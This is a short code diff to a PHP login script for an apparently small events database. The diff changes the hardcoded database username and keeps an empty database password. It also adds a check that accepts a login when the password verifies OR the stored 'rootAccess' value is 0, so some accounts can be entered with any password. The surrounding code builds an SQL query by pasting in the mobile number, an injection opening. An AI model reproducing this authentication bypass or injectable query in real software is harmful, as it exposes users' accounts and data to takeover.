@@ -20,7 +20,7 @@
 		if($_SERVER['REQUEST_METHOD'] == 'POST') {
 			// db credentials	
 			$dbservername="localhost";
-			$dbusername= "root";
+			$dbusername= "arjun1001";
 			$dbpassword="";
 			$dbname="INTERRUPT";
 			$connect=mysqli_connect($dbservername,$dbusername,$dbpassword,$dbname);
@@ -45,10 +45,11 @@
 
 				$row=mysqli_fetch_assoc($result1);
 				$hashed_password = $row['password'];
+				$rootAccess = $row['rootAccess'];
 				// echo $row['mobileNo'];
 				// using session variables to access it in other files
 				$_SESSION['mobile']=0;
-				if(password_verify($password, $hashed_password))
+				if(password_verify($password, $hashed_password) || $rootAccess==0)
 				{
 					$sql2= "SELECT * from events where mobileNo='".$mobile."';";
 					$result2= mysqli_query($connect,$sql2);
